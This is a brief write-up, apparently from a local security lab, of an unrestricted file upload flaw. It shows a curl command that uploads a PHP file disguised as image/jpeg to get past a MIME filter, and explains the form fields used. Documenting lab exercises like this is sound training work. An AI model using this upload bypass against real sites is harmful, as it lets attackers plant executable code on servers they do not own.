# Unrestricted file upload

Wetried to upload several file with different MIME/extenstion and only .jpeg worked.
So we had to upload a file.php as file.jpeg

```bash
$> curl -X POST -F "uploaded=@image.php;type=image/jpeg" -F "MAX_FILE_SIZE=100000" -F "Upload=Upload"  http://localhost:9000/index.php\?page\=upload
```

The three arguments:  
- -F "uploaded=@image.php;type=image/jpeg", means the file named uploaded is type .jpeg  
- -F "MAX_FILE_SIZE=100000"
- -F "Upload=Upload  
we just set the value as it is in the site, tso the form is complete and we can send a request.
